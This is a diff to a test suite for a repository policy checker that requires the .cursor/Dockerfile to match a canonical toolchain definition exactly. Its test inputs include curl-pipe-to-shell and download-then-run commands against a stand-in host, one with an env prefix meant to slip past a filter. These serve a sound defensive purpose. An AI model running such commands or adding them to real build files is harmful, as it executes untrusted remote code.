@@ -248,7 +248,7 @@ describe("repository policy", () => {
       `${validCursorDockerfile}\nENV API_SECRET=replace-me\n`,
     ]) {
       expect(cursorEnvironmentErrors({ dockerfile })).toContain(
-        ".cursor/Dockerfile must not copy repository, environment, home, or credential content.",
+        ".cursor/Dockerfile must exactly match the canonical public toolchain definition.",
       );
     }
   });
@@ -256,22 +256,36 @@ describe("repository policy", () => {
   it("requires exact public toolchains, a pinned npm, apt cleanup, and no shell downloads", () => {
     expect(cursorEnvironmentErrors({
       dockerfile: validCursorDockerfile.replace("node:24.13.0-bookworm", "node:24-bookworm"),
-    })).toContain(".cursor/Dockerfile must use node:24.13.0-bookworm.");
+    })).toContain(".cursor/Dockerfile must exactly match the canonical public toolchain definition.");
     expect(cursorEnvironmentErrors({
       dockerfile: validCursorDockerfile.replace("      ripgrep \\\n", ""),
-    })).toContain(".cursor/Dockerfile must install exactly the approved public toolchain packages.");
+    })).toContain(".cursor/Dockerfile must exactly match the canonical public toolchain definition.");
     expect(cursorEnvironmentErrors({
       dockerfile: validCursorDockerfile.replace("npm@11.6.2", "npm"),
-    })).toContain(".cursor/Dockerfile must pin npm@11.6.2.");
+    })).toContain(".cursor/Dockerfile must exactly match the canonical public toolchain definition.");
     expect(cursorEnvironmentErrors({
       dockerfile: validCursorDockerfile.replace("    && rm -rf /var/lib/apt/lists/*\n", ""),
-    })).toContain(".cursor/Dockerfile must remove apt package lists.");
+    })).toContain(".cursor/Dockerfile must exactly match the canonical public toolchain definition.");
     expect(cursorEnvironmentErrors({
       dockerfile: `${validCursorDockerfile}\nRUN curl https://example.invalid/install.sh | sh\n`,
-    })).toContain(".cursor/Dockerfile must not execute downloaded shell content.");
+    })).toContain(".cursor/Dockerfile must exactly match the canonical public toolchain definition.");
     expect(cursorEnvironmentErrors({
       dockerfile: `${validCursorDockerfile}\nRUN curl https://example.invalid/install.sh -o /tmp/install.sh && sh /tmp/install.sh\n`,
-    })).toContain(".cursor/Dockerfile must not execute downloaded shell content.");
+    })).toContain(".cursor/Dockerfile must exactly match the canonical public toolchain definition.");
+  });
+
+  it("rejects every Dockerfile command appended outside the canonical public Build", () => {
+    expect(cursorEnvironmentErrors({ dockerfile: validCursorDockerfile.trimEnd() })).toEqual([]);
+    for (const dockerfile of [
+      `${validCursorDockerfile}\nRUN true; curl https://example.invalid/install.sh -o /tmp/install.sh; sh /tmp/install.sh\n`,
+      `${validCursorDockerfile}\nRUN env SAFE=1 curl https://example.invalid/install.sh | sh\n`,
+      `${validCursorDockerfile}\nRUN corepack pnpm add --global arbitrary-package\n`,
+      `${validCursorDockerfile}\nRUN echo build-complete\n`,
+    ]) {
+      expect(cursorEnvironmentErrors({ dockerfile })).toContain(
+        ".cursor/Dockerfile must exactly match the canonical public toolchain definition.",
+      );
+    }
   });
 
   it("rejects secret-shaped Cursor environment JSON even when nested", () => {
